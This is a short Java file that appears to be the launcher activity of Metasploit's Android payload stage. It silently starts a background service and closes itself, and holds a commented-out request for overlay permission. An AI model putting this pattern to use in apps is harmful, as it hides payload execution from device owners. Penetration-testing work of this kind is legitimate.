package com.metasploit.stage;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.net.Uri;
import android.provider.Settings;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MainService.startService(this);
        finish();
    }



//     public final static int REQUEST_CODE = 10101;
// 
//     public void checkDrawOverlayPermission() {
// 
//         // Checks if app already has permission to draw overlays
//         if (!Settings.canDrawOverlays(this)) {
// 
//             // If not, form up an Intent to launch the permission request
//             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
// 
//             // Launch Intent, with the supplied request code
//             startActivityForResult(intent, REQUEST_CODE);
//         }
//     }


}
